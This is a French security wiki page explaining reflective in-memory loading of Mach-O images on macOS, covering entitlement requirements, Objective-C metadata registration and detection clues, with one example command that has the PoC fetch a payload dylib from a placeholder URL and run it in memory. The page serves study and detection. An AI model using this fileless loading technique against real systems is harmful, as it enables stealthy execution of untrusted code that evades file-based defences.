# Chargement Reflective Mach-O sur macOS

{{#include ../../../banners/hacktricks-training.md}}

Un reflective loader mappe une image Mach-O à partir d’octets déjà présents dans son propre processus, puis la lie et exécute ses initialiseurs sans demander au chargeur système d’ouvrir un fichier payload. Il s’agit d’une **exécution de code dans le processus**, et non d’une primitive d’élévation de privilèges ou d’injection dans un processus distant.<sup>[[2]](#references)</sup>

Sur les versions récentes de macOS, l’ancienne méthode `NSCreateObjectFileImageFromMemory`/`NSLinkModule` écrit l’image sur le disque. ReflectiveLoader intègre plutôt l’ancien code de chargement dyld d’Apple ; Wardle en a fait la démonstration sur macOS 15 et 26.<sup>[[2]](#references)[[3]](#references)</sup>

Si le loader utilise le Hardened Runtime, son code non signé en mémoire nécessite une exception de mémoire exécutable telle que `com.apple.security.cs.allow-unsigned-executable-memory` ou `com.apple.security.cs.disable-executable-page-protection` ; sinon, l’exécution est bloquée par l’application des règles de signature du code. Il s’agit d’une contrainte de signature du loader, et non d’une primitive d’élévation de privilèges. Consultez la [référence des entitlements macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Pour le PoC, fournissez une URL qui héberge un **bundle, framework ou dylib** Mach-O brut. Son `main.mm` rejette les téléchargements vides et indique que les payloads utilisant `LC_DYLD_CHAINED_FIXUPS` ne sont pas pris en charge. Un chemin local est également accepté, mais cette entrée ne correspond pas à un workflow sans fichier. La forme avec URL lit les octets dans `NSData` et transmet son buffer et sa longueur à `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Le loader intégré appelle `ImageLoaderMachO::instantiateFromMemory`, puis `image->link`. Il enregistre les métadonnées Objective-C **après le linking, mais avant** `image->runInitializers`, qui exécute les constructeurs.<sup>[[5]](#references)</sup> Sans cet enregistrement, un constructeur qui envoie un message Objective-C peut échouer avec `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Consultez le [flux normal de chargement d’image de dyld](macos-library-injection/macos-dyld-process.md#flow) et la [référence des sections Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Activation des métadonnées Objective-C

Contrairement au chargement normal de dyld, l’intégration de l’ancien loader d’image ne rend pas automatiquement les métadonnées Objective-C du payload utilisables par `libobjc`.<sup>[[3]](#references)</sup> L’approche adaptée du LLVM JIT parcourt les sections Objective-C mappées `__DATA` et `__DATA_CONST`, puis effectue les étapes suivantes avant l’exécution des constructeurs :<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Parcourir `__objc_selrefs` par pas de `sizeof(SEL)`. Obtenir le nom de chaque selector non nul avec `sel_getName`, le transmettre à `sel_registerName`, puis remplacer le pointeur de la section par le `SEL` canonique.
2. Collecter les classes de `__objc_classlist` et les enregistrer avec `objc_readClassPair`, en résolvant d’abord les dépendances des superclasses.
3. Réécrire les références de `__objc_classrefs` et `__objc_superrefs` pour qu’elles pointent vers les classes ou métaclasses enregistrées, et attacher les méthodes des catégories depuis `__objc_catlist`.

Par exemple, la réparation des selectors dans `ObjCRuntime.cpp` équivaut à :<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

La PoC repose sur le comportement interne du runtime Objective-C et ne prend pas en charge toutes les fonctionnalités du format Mach-O ; son code d'enregistrement sert donc de référence d'implémentation plutôt que de loader générique prêt à l'emploi.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> L'enregistrement est nécessaire pour les classes et méthodes Apple référencées, ainsi que pour les classes définies par le payload.<sup>[[3]](#references)</sup>

Dans les tests de l'auteur, une image chargée de manière reflective n'apparaît pas dans `dyld_all_image_infos`. Ses mappings exécutables anonymes peuvent plutôt apparaître sous forme de régions `dylib` sans nom dans `vmmap` ; les frames échantillonnées peuvent être affichées comme `<unknown binary>`. Ce sont des indices utiles à l'inspection, mais ils ne permettent pas d'attribuer de façon fiable l'image à ce loader, et l'accès aux informations de tâche d'un autre processus est limité par les entitlements. Consultez [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) pour connaître les contraintes d'accès aux processus.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C et Swift sur macOS : synthèse des connaissances](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Rétablir le chargement de code reflective sur macOS (partie I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Rétablir le chargement de code reflective sur macOS (partie II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [Fichier main.mm de la PoC ReflectiveLoader](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [Fichier custom_dlfcn.cpp de ReflectiveLoader](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [Fichier ObjCRuntime.cpp de ReflectiveLoader](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
